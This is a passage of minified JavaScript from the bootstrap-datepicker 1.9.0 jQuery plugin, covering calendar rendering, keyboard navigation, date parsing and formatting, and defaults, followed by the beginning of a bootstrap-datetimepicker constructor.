return this.o.endDate }, setEndDate: function (t) { return this._process_options({ endDate: t }), this.update(), this.updateNavArrows(), this }, setDaysOfWeekDisabled: function (t) { return this._process_options({ daysOfWeekDisabled: t }), this.update(), this }, setDaysOfWeekHighlighted: function (t) { return this._process_options({ daysOfWeekHighlighted: t }), this.update(), this }, setDatesDisabled: function (t) { return this._process_options({ datesDisabled: t }), this.update(), this }, place: function () { if (this.isInline) return this; var t = this.picker.outerWidth(), e = this.picker.outerHeight(), n = w(this.o.container), i = n.width(), o = "body" === this.o.container ? w(document).scrollTop() : n.scrollTop(), a = n.offset(), s = [0]; this.element.parents().each(function () { var t = w(this).css("z-index"); "auto" !== t && 0 !== Number(t) && s.push(Number(t)) }); var r = Math.max.apply(Math, s) + this.o.zIndexOffset, g = this.component ? this.component.parent().offset() : this.element.offset(), l = this.component ? this.component.outerHeight(!0) : this.element.outerHeight(!1), c = this.component ? this.component.outerWidth(!0) : this.element.outerWidth(!1), I = g.left - a.left, u = g.top - a.top; "body" !== this.o.container && (u += o), this.picker.removeClass("datepicker-orient-top datepicker-orient-bottom datepicker-orient-right datepicker-orient-left"), "auto" !== this.o.orientation.x ? (this.picker.addClass("datepicker-orient-" + this.o.orientation.x), "right" === this.o.orientation.x && (I -= t - c)) : g.left < 0 ? (this.picker.addClass("datepicker-orient-left"), I -= g.left - 10) : i < I + t ? (this.picker.addClass("datepicker-orient-right"), I += c - t) : this.o.rtl ? this.picker.addClass("datepicker-orient-right") : this.picker.addClass("datepicker-orient-left"); var h, d = this.o.orientation.y; return "auto" === d && (d = -o + u - e < 0 ? "bottom" : "top"), this.picker.addClass("datepicker-orient-" + d), "top" === d ? u -= e + parseInt(this.picker.css("padding-top")) : u += l, this.o.rtl ? (h = i - (I + c), this.picker.css({ top: u, right: h, zIndex: r })) : this.picker.css({ top: u, left: I, zIndex: r }), this }, _allow_update: !0, update: function () { if (!this._allow_update) return this; var t = this.dates.copy(), n = [], e = !1; return arguments.length ? (w.each(arguments, w.proxy(function (t, e) { e instanceof Date && (e = this._local_to_utc(e)), n.push(e) }, this)), e = !0) : (n = (n = this.isInput ? this.element.val() : this.element.data("date") || this.inputField.val()) && this.o.multidate ? n.split(this.o.multidateSeparator) : [n], delete this.element.data().date), n = w.map(n, w.proxy(function (t) { return Z.parseDate(t, this.o.format, this.o.language, this.o.assumeNearbyYear) }, this)), n = w.grep(n, w.proxy(function (t) { return !this.dateWithinRange(t) || !t }, this), !0), this.dates.replace(n), this.o.updateViewDate && (this.dates.length ? this.viewDate = new Date(this.dates.get(-1)) : this.viewDate < this.o.startDate ? this.viewDate = new Date(this.o.startDate) : this.viewDate > this.o.endDate ? this.viewDate = new Date(this.o.endDate) : this.viewDate = this.o.defaultViewDate), e ? (this.setValue(), this.element.change()) : this.dates.length && String(t) !== String(this.dates) && e && (this._trigger("changeDate"), this.element.change()), !this.dates.length && t.length && (this._trigger("clearDate"), this.element.change()), this.fill(), this }, fillDow: function () { if (this.o.showWeekDays) { var t = this.o.weekStart, e = "<tr>"; for (this.o.calendarWeeks && (e += '<th class="cw">&#160;</th>'); t < this.o.weekStart + 7;)e += '<th class="dow', -1 !== w.inArray(t, this.o.daysOfWeekDisabled) && (e += " disabled"), e += '">' + D[this.o.language].daysMin[t++ % 7] + "</th>"; e += "</tr>", this.picker.find(".datepicker-days thead").append(e) } }, fillMonths: function () { for (var t = this._utc_to_local(this.viewDate), e = "", n = 0; n < 12; n++)e += '<span class="month' + (t && t.getMonth() === n ? " focused" : "") + '">' + D[this.o.language].monthsShort[n] + "</span>"; this.picker.find(".datepicker-months td").html(e) }, setRange: function (t) { t && t.length ? this.range = w.map(t, function (t) { return t.valueOf() }) : delete this.range, this.fill() }, getClassNames: function (t) { var e = [], n = this.viewDate.getUTCFullYear(), i = this.viewDate.getUTCMonth(), o = k(); return t.getUTCFullYear() < n || t.getUTCFullYear() === n && t.getUTCMonth() < i ? e.push("old") : (t.getUTCFullYear() > n || t.getUTCFullYear() === n && t.getUTCMonth() > i) && e.push("new"), this.focusDate && t.valueOf() === this.focusDate.valueOf() && e.push("focused"), this.o.todayHighlight && a(t, o) && e.push("today"), -1 !== this.dates.contains(t) && e.push("active"), this.dateWithinRange(t) || e.push("disabled"), this.dateIsDisabled(t) && e.push("disabled", "disabled-date"), -1 !== w.inArray(t.getUTCDay(), this.o.daysOfWeekHighlighted) && e.push("highlighted"), this.range && (t > this.range[0] && t < this.range[this.range.length - 1] && e.push("range"), -1 !== w.inArray(t.valueOf(), this.range) && e.push("selected"), t.valueOf() === this.range[0] && e.push("range-start"), t.valueOf() === this.range[this.range.length - 1] && e.push("range-end")), e }, _fill_yearsView: function (t, e, n, i, o, a, s) { for (var r, g, l, c = "", I = n / 10, u = this.picker.find(t), h = Math.floor(i / n) * n, d = h + 9 * I, C = Math.floor(this.viewDate.getFullYear() / I) * I, A = w.map(this.dates, function (t) { return Math.floor(t.getUTCFullYear() / I) * I }), p = h - I; p <= d + I; p += I)r = [e], g = null, p === h - I ? r.push("old") : p === d + I && r.push("new"), -1 !== w.inArray(p, A) && r.push("active"), (p < o || a < p) && r.push("disabled"), p === C && r.push("focused"), s !== w.noop && ((l = s(new Date(p, 0, 1))) === X ? l = {} : "boolean" == typeof l ? l = { enabled: l } : "string" == typeof l && (l = { classes: l }), !1 === l.enabled && r.push("disabled"), l.classes && (r = r.concat(l.classes.split(/\s+/))), l.tooltip && (g = l.tooltip)), c += '<span class="' + r.join(" ") + '"' + (g ? ' title="' + g + '"' : "") + ">" + p + "</span>"; u.find(".datepicker-switch").text(h + "-" + d), u.find("td").html(c) }, fill: function () { var t, e, n = new Date(this.viewDate), o = n.getUTCFullYear(), i = n.getUTCMonth(), a = this.o.startDate !== -1 / 0 ? this.o.startDate.getUTCFullYear() : -1 / 0, s = this.o.startDate !== -1 / 0 ? this.o.startDate.getUTCMonth() : -1 / 0, r = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCFullYear() : 1 / 0, g = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCMonth() : 1 / 0, l = D[this.o.language].today || D.en.today || "", c = D[this.o.language].clear || D.en.clear || "", I = D[this.o.language].titleFormat || D.en.titleFormat, u = k(), h = (!0 === this.o.todayBtn || "linked" === this.o.todayBtn) && u >= this.o.startDate && u <= this.o.endDate && !this.weekOfDateIsDisabled(u); if (!isNaN(o) && !isNaN(i)) { this.picker.find(".datepicker-days .datepicker-switch").text(Z.formatDate(n, I, this.o.language)), this.picker.find("tfoot .today").text(l).css("display", h ? "table-cell" : "none"), this.picker.find("tfoot .clear").text(c).css("display", !0 === this.o.clearBtn ? "table-cell" : "none"), this.picker.find("thead .datepicker-title").text(this.o.title).css("display", "string" == typeof this.o.title && "" !== this.o.title ? "table-cell" : "none"), this.updateNavArrows(), this.fillMonths(); var d = S(o, i, 0), C = d.getUTCDate(); d.setUTCDate(C - (d.getUTCDay() - this.o.weekStart + 7) % 7); var A = new Date(d); d.getUTCFullYear() < 100 && A.setUTCFullYear(d.getUTCFullYear()), A.setUTCDate(A.getUTCDate() + 42), A = A.valueOf(); for (var p, m, f, b, B, y, v = []; d.valueOf() < A;) { (p = d.getUTCDay()) === this.o.weekStart && (v.push("<tr>"), this.o.calendarWeeks) && (f = new Date(+d + (this.o.weekStart - p - 7) % 7 * 864e5), b = new Date(Number(f) + (11 - f.getUTCDay()) % 7 * 864e5), B = new Date(Number(B = S(b.getUTCFullYear(), 0, 1)) + (11 - B.getUTCDay()) % 7 * 864e5), y = (b - B) / 864e5 / 7 + 1, v.push('<td class="cw">' + y + "</td>")), (m = this.getClassNames(d)).push("day"); var x = d.getUTCDate(); this.o.beforeShowDay !== w.noop && ((e = this.o.beforeShowDay(this._utc_to_local(d))) === X ? e = {} : "boolean" == typeof e ? e = { enabled: e } : "string" == typeof e && (e = { classes: e }), !1 === e.enabled && m.push("disabled"), e.classes && (m = m.concat(e.classes.split(/\s+/))), e.tooltip && (t = e.tooltip), e.content && (x = e.content)), m = w.isFunction(w.uniqueSort) ? w.uniqueSort(m) : w.unique(m), v.push('<td class="' + m.join(" ") + '"' + (t ? ' title="' + t + '"' : "") + ' data-date="' + d.getTime().toString() + '">' + x + "</td>"), t = null, p === this.o.weekEnd && v.push("</tr>"), d.setUTCDate(d.getUTCDate() + 1) } this.picker.find(".datepicker-days tbody").html(v.join("")); var F, Q = D[this.o.language].monthsTitle || D.en.monthsTitle || "Months", G = this.picker.find(".datepicker-months").find(".datepicker-switch").text(this.o.maxViewMode < 2 ? Q : o).end().find("tbody span").removeClass("active"); w.each(this.dates, function (t, e) { e.getUTCFullYear() === o && G.eq(e.getUTCMonth()).addClass("active") }), (o < a || r < o) && G.addClass("disabled"), o === a && G.slice(0, s).addClass("disabled"), o === r && G.slice(g + 1).addClass("disabled"), this.o.beforeShowMonth !== w.noop && (F = this, w.each(G, function (t, e) { var n = new Date(o, t, 1), i = F.o.beforeShowMonth(n); i === X ? i = {} : "boolean" == typeof i ? i = { enabled: i } : "string" == typeof i && (i = { classes: i }), !1 !== i.enabled || w(e).hasClass("disabled") || w(e).addClass("disabled"), i.classes && w(e).addClass(i.classes), i.tooltip && w(e).prop("title", i.tooltip) })), this._fill_yearsView(".datepicker-years", "year", 10, o, a, r, this.o.beforeShowYear), this._fill_yearsView(".datepicker-decades", "decade", 100, o, a, r, this.o.beforeShowDecade), this._fill_yearsView(".datepicker-centuries", "century", 1e3, o, a, r, this.o.beforeShowCentury) } }, updateNavArrows: function () { if (this._allow_update) { var t, e, n = new Date(this.viewDate), i = n.getUTCFullYear(), o = n.getUTCMonth(), a = this.o.startDate !== -1 / 0 ? this.o.startDate.getUTCFullYear() : -1 / 0, s = this.o.startDate !== -1 / 0 ? this.o.startDate.getUTCMonth() : -1 / 0, r = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCFullYear() : 1 / 0, g = this.o.endDate !== 1 / 0 ? this.o.endDate.getUTCMonth() : 1 / 0, l = 1; switch (this.viewMode) { case 4: l *= 10; case 3: l *= 10; case 2: l *= 10; case 1: t = Math.floor(i / l) * l <= a, e = Math.floor(i / l) * l + l > r; break; case 0: t = i <= a && o <= s, e = r <= i && g <= o }this.picker.find(".prev").toggleClass("disabled", t), this.picker.find(".next").toggleClass("disabled", e) } }, click: function (t) { var e, n, i; t.preventDefault(), t.stopPropagation(), (e = w(t.target)).hasClass("datepicker-switch") && this.viewMode !== this.o.maxViewMode && this.setViewMode(this.viewMode + 1), e.hasClass("today") && !e.hasClass("day") && (this.setViewMode(0), this._setDate(k(), "linked" === this.o.todayBtn ? null : "view")), e.hasClass("clear") && this.clearDates(), e.hasClass("disabled") || (e.hasClass("month") || e.hasClass("year") || e.hasClass("decade") || e.hasClass("century")) && (this.viewDate.setUTCDate(1), 1 === this.viewMode ? (i = e.parent().find("span").index(e), n = this.viewDate.getUTCFullYear(), this.viewDate.setUTCMonth(i)) : (i = 0, n = Number(e.text()), this.viewDate.setUTCFullYear(n)), this._trigger(Z.viewModes[this.viewMode - 1].e, this.viewDate), this.viewMode === this.o.minViewMode ? this._setDate(S(n, i, 1)) : (this.setViewMode(this.viewMode - 1), this.fill())), this.picker.is(":visible") && this._focused_from && this._focused_from.focus(), delete this._focused_from }, dayCellClick: function (t) { var e = w(t.currentTarget).data("date"), n = new Date(e); this.o.updateViewDate && (n.getUTCFullYear() !== this.viewDate.getUTCFullYear() && this._trigger("changeYear", this.viewDate), n.getUTCMonth() !== this.viewDate.getUTCMonth() && this._trigger("changeMonth", this.viewDate)), this._setDate(n) }, navArrowsClick: function (t) { var e = w(t.currentTarget).hasClass("prev") ? -1 : 1; 0 !== this.viewMode && (e *= 12 * Z.viewModes[this.viewMode].navStep), this.viewDate = this.moveMonth(this.viewDate, e), this._trigger(Z.viewModes[this.viewMode].e, this.viewDate), this.fill() }, _toggle_multidate: function (t) { var e = this.dates.contains(t); if (t || this.dates.clear(), -1 !== e ? (!0 === this.o.multidate || 1 < this.o.multidate || this.o.toggleActive) && this.dates.remove(e) : (!1 === this.o.multidate && this.dates.clear(), this.dates.push(t)), "number" == typeof this.o.multidate) for (; this.dates.length > this.o.multidate;)this.dates.remove(0) }, _setDate: function (t, e) { e && "date" !== e || this._toggle_multidate(t && new Date(t)), (!e && this.o.updateViewDate || "view" === e) && (this.viewDate = t && new Date(t)), this.fill(), this.setValue(), e && "view" === e || this._trigger("changeDate"), this.inputField.trigger("change"), !this.o.autoclose || e && "date" !== e || this.hide() }, moveDay: function (t, e) { var n = new Date(t); return n.setUTCDate(t.getUTCDate() + e), n }, moveWeek: function (t, e) { return this.moveDay(t, 7 * e) }, moveMonth: function (t, e) { if (!(n = t) || isNaN(n.getTime())) return this.o.defaultViewDate; var n; if (!e) return t; var i, o, a = new Date(t.valueOf()), s = a.getUTCDate(), r = a.getUTCMonth(), g = Math.abs(e); if (e = 0 < e ? 1 : -1, 1 === g) o = -1 === e ? function () { return a.getUTCMonth() === r } : function () { return a.getUTCMonth() !== i }, i = r + e, a.setUTCMonth(i), i = (i + 12) % 12; else { for (var l = 0; l < g; l++)a = this.moveMonth(a, e); i = a.getUTCMonth(), a.setUTCDate(s), o = function () { return i !== a.getUTCMonth() } } for (; o();)a.setUTCDate(--s), a.setUTCMonth(i); return a }, moveYear: function (t, e) { return this.moveMonth(t, 12 * e) }, moveAvailableDate: function (t, e, n) { do { if (t = this[n](t, e), !this.dateWithinRange(t)) return !1; n = "moveDay" } while (this.dateIsDisabled(t)); return t }, weekOfDateIsDisabled: function (t) { return -1 !== w.inArray(t.getUTCDay(), this.o.daysOfWeekDisabled) }, dateIsDisabled: function (e) { return this.weekOfDateIsDisabled(e) || 0 < w.grep(this.o.datesDisabled, function (t) { return a(e, t) }).length }, dateWithinRange: function (t) { return t >= this.o.startDate && t <= this.o.endDate }, keydown: function (t) { if (this.picker.is(":visible")) { var e, n, i = !1, o = this.focusDate || this.viewDate; switch (t.keyCode) { case 27: this.focusDate ? (this.focusDate = null, this.viewDate = this.dates.get(-1) || this.viewDate, this.fill()) : this.hide(), t.preventDefault(), t.stopPropagation(); break; case 37: case 38: case 39: case 40: if (!this.o.keyboardNavigation || 7 === this.o.daysOfWeekDisabled.length) break; e = 37 === t.keyCode || 38 === t.keyCode ? -1 : 1, 0 === this.viewMode ? t.ctrlKey ? (n = this.moveAvailableDate(o, e, "moveYear")) && this._trigger("changeYear", this.viewDate) : t.shiftKey ? (n = this.moveAvailableDate(o, e, "moveMonth")) && this._trigger("changeMonth", this.viewDate) : 37 === t.keyCode || 39 === t.keyCode ? n = this.moveAvailableDate(o, e, "moveDay") : this.weekOfDateIsDisabled(o) || (n = this.moveAvailableDate(o, e, "moveWeek")) : 1 === this.viewMode ? (38 !== t.keyCode && 40 !== t.keyCode || (e *= 4), n = this.moveAvailableDate(o, e, "moveMonth")) : 2 === this.viewMode && (38 !== t.keyCode && 40 !== t.keyCode || (e *= 4), n = this.moveAvailableDate(o, e, "moveYear")), n && (this.focusDate = this.viewDate = n, this.setValue(), this.fill(), t.preventDefault()); break; case 13: if (!this.o.forceParse) break; o = this.focusDate || this.dates.get(-1) || this.viewDate, this.o.keyboardNavigation && (this._toggle_multidate(o), i = !0), this.focusDate = null, this.viewDate = this.dates.get(-1) || this.viewDate, this.setValue(), this.fill(), this.picker.is(":visible") && (t.preventDefault(), t.stopPropagation(), this.o.autoclose && this.hide()); break; case 9: this.focusDate = null, this.viewDate = this.dates.get(-1) || this.viewDate, this.fill(), this.hide() }i && (this.dates.length ? this._trigger("changeDate") : this._trigger("clearDate"), this.inputField.trigger("change")) } else 40 !== t.keyCode && 27 !== t.keyCode || (this.show(), t.stopPropagation()) }, setViewMode: function (t) { this.viewMode = t, this.picker.children("div").hide().filter(".datepicker-" + Z.viewModes[this.viewMode].clsName).show(), this.updateNavArrows(), this._trigger("changeViewMode", new Date(this.viewDate)) } }; function l(t, e) { w.data(t, "datepicker", this), this.element = w(t), this.inputs = w.map(e.inputs, function (t) { return t.jquery ? t[0] : t }), delete e.inputs, this.keepEmptyValues = e.keepEmptyValues, delete e.keepEmptyValues, o.call(w(this.inputs), e).on("changeDate", w.proxy(this.dateUpdated, this)), this.pickers = w.map(this.inputs, function (t) { return w.data(t, "datepicker") }), this.updateDates() } l.prototype = { updateDates: function () { this.dates = w.map(this.pickers, function (t) { return t.getUTCDate() }), this.updateRanges() }, updateRanges: function () { var n = w.map(this.dates, function (t) { return t.valueOf() }); w.each(this.pickers, function (t, e) { e.setRange(n) }) }, clearDates: function () { w.each(this.pickers, function (t, e) { e.clearDates() }) }, dateUpdated: function (t) { if (!this.updating) { this.updating = !0; var n = w.data(t.target, "datepicker"); if (n !== X) { var i = n.getUTCDate(), o = this.keepEmptyValues, e = w.inArray(t.target, this.inputs), a = e - 1, s = e + 1, r = this.inputs.length; if (-1 !== e) { if (w.each(this.pickers, function (t, e) { e.getUTCDate() || e !== n && o || e.setUTCDate(i) }), i < this.dates[a]) for (; 0 <= a && i < this.dates[a];)this.pickers[a--].setUTCDate(i); else if (i > this.dates[s]) for (; s < r && i > this.dates[s];)this.pickers[s++].setUTCDate(i); this.updateDates(), delete this.updating } } } }, destroy: function () { w.map(this.pickers, function (t) { t.destroy() }), w(this.inputs).off("changeDate", this.dateUpdated), delete this.element.data().datepicker }, remove: t("destroy", "Method `remove` is deprecated and will be removed in version 2.0. Use `destroy` instead") }; var i = w.fn.datepicker, o = function (s) { var r, g = Array.apply(null, arguments); if (g.shift(), this.each(function () { var t, e, n, i = w(this), o = i.data("datepicker"), a = "object" == typeof s && s; o || (t = function (t, e) { function n(t, e) { return e.toLowerCase() } var i = w(t).data(), o = {}, a = new RegExp("^" + e.toLowerCase() + "([A-Z])"); for (var s in e = new RegExp("^" + e.toLowerCase()), i) e.test(s) && (o[s.replace(a, n)] = i[s]); return o }(this, "date"), e = function (t) { var n = {}; if (D[t] || (t = t.split("-")[0], D[t])) { var i = D[t]; return w.each(I, function (t, e) { e in i && (n[e] = i[e]) }), n } }(w.extend({}, c, t, a).language), n = w.extend({}, c, e, t, a), o = i.hasClass("input-daterange") || n.inputs ? (w.extend(n, { inputs: n.inputs || i.find("input").toArray() }), new l(this, n)) : new B(this, n), i.data("datepicker", o)), "string" == typeof s && "function" == typeof o[s] && (r = o[s].apply(o, g)) }), r === X || r instanceof B || r instanceof l) return this; if (1 < this.length) throw new Error("Using only allowed for the collection of a single element (" + s + " function)"); return r }; w.fn.datepicker = o; var c = w.fn.datepicker.defaults = { assumeNearbyYear: !1, autoclose: !1, beforeShowDay: w.noop, beforeShowMonth: w.noop, beforeShowYear: w.noop, beforeShowDecade: w.noop, beforeShowCentury: w.noop, calendarWeeks: !1, clearBtn: !1, toggleActive: !1, daysOfWeekDisabled: [], daysOfWeekHighlighted: [], datesDisabled: [], endDate: 1 / 0, forceParse: !0, format: "mm/dd/yyyy", keepEmptyValues: !1, keyboardNavigation: !0, language: "en", minViewMode: 0, maxViewMode: 4, multidate: !1, multidateSeparator: ",", orientation: "auto", rtl: !1, startDate: -1 / 0, startView: 0, todayBtn: !1, todayHighlight: !1, updateViewDate: !0, weekStart: 0, disableTouchKeyboard: !1, enableOnReadonly: !0, showOnFocus: !0, zIndexOffset: 10, container: "body", immediateUpdates: !1, title: "", templates: { leftArrow: "&#x00AB;", rightArrow: "&#x00BB;" }, showWeekDays: !0 }, I = w.fn.datepicker.locale_opts = ["format", "rtl", "weekStart"]; w.fn.datepicker.Constructor = B; var D = w.fn.datepicker.dates = { en: { days: ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"], daysShort: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"], daysMin: ["Su", "Mo", "Tu", "We", "Th", "Fr", "Sa"], months: ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"], monthsShort: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"], today: "Today", clear: "Clear", titleFormat: "MM yyyy" } }, Z = { viewModes: [{ names: ["days", "month"], clsName: "days", e: "changeMonth" }, { names: ["months", "year"], clsName: "months", e: "changeYear", navStep: 1 }, { names: ["years", "decade"], clsName: "years", e: "changeDecade", navStep: 10 }, { names: ["decades", "century"], clsName: "decades", e: "changeCentury", navStep: 100 }, { names: ["centuries", "millennium"], clsName: "centuries", e: "changeMillennium", navStep: 1e3 }], validParts: /dd?|DD?|mm?|MM?|yy(?:yy)?/g, nonpunctuation: /[^ -\/:-@\u5e74\u6708\u65e5\[-`{-~\t\n\r]+/g, parseFormat: function (t) { if ("function" == typeof t.toValue && "function" == typeof t.toDisplay) return t; var e = t.replace(this.validParts, "\0").split("\0"), n = t.match(this.validParts); if (!e || !e.length || !n || 0 === n.length) throw new Error("Invalid date format."); return { separators: e, parts: n } }, parseDate: function (t, e, n, o) { function i() { var t = this.slice(0, a[f].length), e = a[f].slice(0, t.length); return t.toLowerCase() === e.toLowerCase() } if (!t) return X; if (t instanceof Date) return t; if ("string" == typeof e && (e = Z.parseFormat(e)), e.toValue) return e.toValue(t, e, n); var a, s, r, g, l = { d: "moveDay", m: "moveMonth", w: "moveWeek", y: "moveYear" }, c = { yesterday: "-1d", today: "+0d", tomorrow: "+1d" }; if (t in c && (t = c[t]), /^[\-+]\d+[dmwy]([\s,]+[\-+]\d+[dmwy])*$/i.test(t)) { for (a = t.match(/([\-+]\d+)([dmwy])/gi), t = new Date, f = 0; f < a.length; f++)s = a[f].match(/([\-+]\d+)([dmwy])/i), r = Number(s[1]), g = l[s[2].toLowerCase()], t = B.prototype[g](t, r); return B.prototype._zero_utc_time(t) } a = t && t.match(this.nonpunctuation) || []; var I, u, h = {}, d = ["yyyy", "yy", "M", "MM", "m", "mm", "d", "dd"], C = { yyyy: function (t, e) { return t.setUTCFullYear(o ? (!0 === (i = o) && (i = 10), (n = e) < 100 && (n += 2e3) > (new Date).getFullYear() + i && (n -= 100), n) : e); var n, i }, m: function (t, e) { if (isNaN(t)) return t; for (--e; e < 0;)e += 12; for (e %= 12, t.setUTCMonth(e); t.getUTCMonth() !== e;)t.setUTCDate(t.getUTCDate() - 1); return t }, d: function (t, e) { return t.setUTCDate(e) } }; C.yy = C.yyyy, C.M = C.MM = C.mm = C.m, C.dd = C.d, t = k(); var A = e.parts.slice(); if (a.length !== A.length && (A = w(A).filter(function (t, e) { return -1 !== w.inArray(e, d) }).toArray()), a.length === A.length) { for (var p, m, f = 0, b = A.length; f < b; f++) { if (I = parseInt(a[f], 10), s = A[f], isNaN(I)) switch (s) { case "MM": u = w(D[n].months).filter(i), I = w.inArray(u[0], D[n].months) + 1; break; case "M": u = w(D[n].monthsShort).filter(i), I = w.inArray(u[0], D[n].monthsShort) + 1 }h[s] = I } for (f = 0; f < d.length; f++)(m = d[f]) in h && !isNaN(h[m]) && (p = new Date(t), C[m](p, h[m]), isNaN(p) || (t = p)) } return t }, formatDate: function (t, e, n) { if (!t) return ""; if ("string" == typeof e && (e = Z.parseFormat(e)), e.toDisplay) return e.toDisplay(t, e, n); var i = { d: t.getUTCDate(), D: D[n].daysShort[t.getUTCDay()], DD: D[n].days[t.getUTCDay()], m: t.getUTCMonth() + 1, M: D[n].monthsShort[t.getUTCMonth()], MM: D[n].months[t.getUTCMonth()], yy: t.getUTCFullYear().toString().substring(2), yyyy: t.getUTCFullYear() }; i.dd = (i.d < 10 ? "0" : "") + i.d, i.mm = (i.m < 10 ? "0" : "") + i.m, t = []; for (var o = w.extend([], e.separators), a = 0, s = e.parts.length; a <= s; a++)o.length && t.push(o.shift()), t.push(i[e.parts[a]]); return t.join("") }, headTemplate: '<thead><tr><th colspan="7" class="datepicker-title"></th></tr><tr><th class="prev">' + c.templates.leftArrow + '</th><th colspan="5" class="datepicker-switch"></th><th class="next">' + c.templates.rightArrow + "</th></tr></thead>", contTemplate: '<tbody><tr><td colspan="7"></td></tr></tbody>', footTemplate: '<tfoot><tr><th colspan="7" class="today"></th></tr><tr><th colspan="7" class="clear"></th></tr></tfoot>' }; Z.template = '<div class="datepicker"><div class="datepicker-days"><table class="table-condensed">' + Z.headTemplate + "<tbody></tbody>" + Z.footTemplate + '</table></div><div class="datepicker-months"><table class="table-condensed">' + Z.headTemplate + Z.contTemplate + Z.footTemplate + '</table></div><div class="datepicker-years"><table class="table-condensed">' + Z.headTemplate + Z.contTemplate + Z.footTemplate + '</table></div><div class="datepicker-decades"><table class="table-condensed">' + Z.headTemplate + Z.contTemplate + Z.footTemplate + '</table></div><div class="datepicker-centuries"><table class="table-condensed">' + Z.headTemplate + Z.contTemplate + Z.footTemplate + "</table></div></div>", w.fn.datepicker.DPGlobal = Z, w.fn.datepicker.noConflict = function () { return w.fn.datepicker = i, this }, w.fn.datepicker.version = "1.9.0", w.fn.datepicker.deprecated = function (t) { var e = window.console; e && e.warn && e.warn("DEPRECATED: " + t) }, w(document).on("focus.datepicker.data-api click.datepicker.data-api", '[data-provide="datepicker"]', function (t) { var e = w(this); e.data("datepicker") || (t.preventDefault(), o.call(e, "show")) }), w(function () { o.call(w('[data-provide="datepicker-inline"]')) }) }), $.fn.datepicker.defaults.zIndexOffset = 10, function (t) { "function" == typeof define && define.amd ? define(["jquery"], t) : "object" == typeof exports ? t(require("jquery")) : t(jQuery) }(function (G, s) { function w() { return new Date(Date.UTC.apply(Date, arguments)) } "indexOf" in Array.prototype || (Array.prototype.indexOf = function (t, e) { e === s && (e = 0), e < 0 && (e += this.length), e < 0 && (e = 0); for (var n = this.length; e < n; e++)if (e in this && this[e] === t) return e; return -1 }); function m(t, a) { var e = this; this.element = G(t), this.container = a.container || "body", this.language = a.language || this.element.data("date-language") || "en", this.language = this.language in S ? this.language : this.language.split("-")[0], this.language = this.language in S ? this.language : "en", this.isRTL = S[this.language].rtl || !1, this.formatType = a.formatType || this.element.data("format-type") || "standard", this.format = k.parseFormat(a.format || this.element.data("date-format") || S[this.language].format || k.getDefaultFormat(this.formatType, "input"), this.formatType), this.isInline = !1, this.isVisible = !1, this.isInput = this.element.is("input"), this.fontAwesome = a.fontAwesome || this.element.data("font-awesome") || !1, this.bootcssVer = a.bootcssVer || (this.isInput ? this.element.is(".form-control") ? 3 : 2 : this.bootcssVer = this.element.is(".input-group") ? 3 : 2), this.component = !!this.element.is(".date") && (3 === this.bootcssVer ? this.element.find(".input-group-addon .glyphicon-th, .input-group-addon .glyphicon-time, .input-group-addon .glyphicon-remove, .input-group-addon .glyphicon-calendar, .input-group-addon .fa-calendar, .input-group-addon .fa-clock-o").parent() : this.element.find(".add-on .icon-th, .add-on .icon-time, .add-on .icon-calendar, .add-on .fa-calendar, .add-on .fa-clock-o").parent()), this.componentReset = !!this.element.is(".date") && (3 === this.bootcssVer ? this.element.find(".input-group-addon .glyphicon-remove, .input-group-addon .fa-times").parent() : this.element.find(".add-on .icon-remove, .add-on .fa-times").parent()), this.hasInput = this.component && this.element.find("input").length, this.component && 0 === this.component.length && (this.component = !1), this.linkField = a.linkField || this.element.data("link-field") || !1, this.linkFormat = k.parseFormat(a.linkFormat || this.element.data("link-format") || k.getDefaultFormat(this.formatType, "link"), this.formatType), this.minuteStep = a.minuteStep || this.element.data("minute-step") || 5, this.pickerPosition = a.pickerPosition || this.element.data("picker-position") || "bottom-right", this.showMeridian = a.showMeridian || this.element.data("show-meridian") || !1, this.initialDate = a.initialDate || new Date, this.zIndex = a.zIndex || this.element.data("z-index") || s, this.title = void 0 !== a.title && a.title, this.timezone = a.timezone || function () { var t, e, n, i = (new Date).toString(), o = (null != (n = i.split("(")[1]) ? n.slice(0, -1) : 0) || i.split(" "); if (o instanceof Array) { e = []; for (var a = 0, s = o.length; a < s; a++)(t = null !== (n = o[a].match(/\b[A-Z]+\b/))) && n[0] && e.push(t); o = e.pop() } return o }(), this.icons = { leftArrow: this.fontAwesome ? "fa-arrow-left" : 3 === this.bootcssVer ? "glyphicon-arrow-left" : "icon-arrow-left", rightArrow: this.fontAwesome ? "fa-arrow-right" : 3 === this.bootcssVer ? "glyphicon-arrow-right" : "icon-arrow-right" }, this.icontype = this.fontAwesome ? "fa" : "glyphicon", this._attachEvents(), this.clickedOutside = function (t) { 0 === G(t.target).closest(".datetimepicker").length && e.hide() }, this.formatViewType = "datetime", "formatViewType" in a ? this.formatViewType = a.formatViewType : "formatViewType" in this.element.data() && (this.formatViewType = this.element.data("formatViewType")), this.minView = 0, "minView" in a ? this.minView = a.minView : "minView" in this.element.data() && (this.minView = this.element.data("min-view")), this.minView = k.convertViewMode(this.minView), this.maxView = k.modes.length - 1, "maxView" in a ? this.maxView = a.maxView : "maxView" in this.element.data() && (this.maxView = this.element.data("max-view")), this.maxView = k.convertViewMode(this.maxView), this.wheelViewModeNavigation = !1, "wheelViewModeNavigation" in a ? this.wheelViewModeNavigation = a.wheelViewModeNavigation : "wheelViewModeNavigation" in this.element.data() && (this.wheelViewModeNavigation = this.element.data("view-mode-wheel-navigation")), this.wheelViewModeNavigationInverseDirection = !1, "wheelViewModeNavigationInverseDirection" in a ? this.wheelViewModeNavigationInverseDirection = a.wheelViewModeNavigationInverseDirection : "wheelViewModeNavigationInverseDirection" in this.element.data() && (this.wheelViewModeNavigationInverseDirection = this.element.data("view-mode-wheel-navigation-inverse-dir")), this.wheelViewModeNavigationDelay = 100, "wheelViewModeNavigationDelay" in a ? this.wheelViewModeNavigationDelay = a.wheelViewModeNavigationDelay : "wheelViewModeNavigationDelay" in this.element.data() && (this.wheelViewModeNavigationDelay = this.element.data("view-mode-wheel-navigation-delay")), this.startViewMode = 2, "startView" in a ? this.startViewMode = a.startView : "startView" in this.element.data() && (this.startViewMode = this.element.data("start-view")), this.startViewMode = k.convertViewMode(this.startViewMode), this.viewMode = 